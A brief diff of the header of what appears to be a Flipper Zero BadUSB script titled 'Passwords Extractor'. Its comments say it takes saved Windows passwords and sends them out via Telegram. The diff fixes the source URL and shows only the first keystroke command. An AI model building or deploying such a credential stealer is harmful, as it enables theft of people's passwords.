@@ -1,7 +1,7 @@
 REM Title: Passwords Extractor
 REM Author: shp3x
 REM Description: Extracts saved passwords and send them via Telegram.
-REM Original: https://github.com/shp3x/FlipperZero/BadUSB/WebToTelegram.txt
+REM Original: https://github.com/shp3x/FlipperZero/blob/main/BadUSB/Web2Telegram.txt
 REM Target:	Windows
 REM
 GUI r
